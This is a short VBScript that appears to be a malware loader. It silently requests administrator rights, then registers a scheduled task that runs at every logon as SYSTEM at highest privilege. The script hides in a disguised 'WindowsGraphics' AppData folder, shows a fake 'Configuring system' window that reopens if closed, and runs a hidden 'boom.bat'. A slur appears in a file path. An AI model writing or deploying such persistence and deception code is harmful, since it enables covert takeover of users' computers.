Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' --- CONFIGURATION ---
strPath = "C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics"
strScript = strPath & "\launcher.vbs"
WshShell.CurrentDirectory = strPath

' --- STEP 1: ELEVATION CHECK ---
If Not WScript.Arguments.Named.Exists("task") And Not WScript.Arguments.Named.Exists("elevate") Then
    UAC.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 0
    WScript.Quit
End If

' --- STEP 2: THE "STICKY" TASK CREATION ---
strTaskName = "ForexForgeSync"
' We use triple quotes to ensure the path is preserved inside the task
strRunCmd = "wscript.exe //B """ & strScript & """ /task"
strCreateTask = "schtasks /create /tn """ & strTaskName & """ /tr """ & strRunCmd & """ /sc onlogon /rl highest /ru ""SYSTEM"" /f"

startTime = Timer
Do While Timer < startTime + 30
    ' This re-launches the EXACT command if the user closes it
    WshShell.Run "cmd.exe /c title System Configuration && color 1f && echo. && echo  Configuring system... Please wait. && " & strCreateTask & " && timeout /t 30 /nobreak > nul", 1, True
    
    If Timer < startTime + 30 Then 
        WScript.Sleep 500 
    End If
Loop

' --- STEP 3: INITIAL SETUP ---
If WScript.Arguments.Named.Exists("elevate") Then
    If FSO.FileExists(strPath & "\boom.bat") Then
        WshShell.Run "cmd.exe /c boom.bat", 0, True
    End If
End If

WScript.Quit
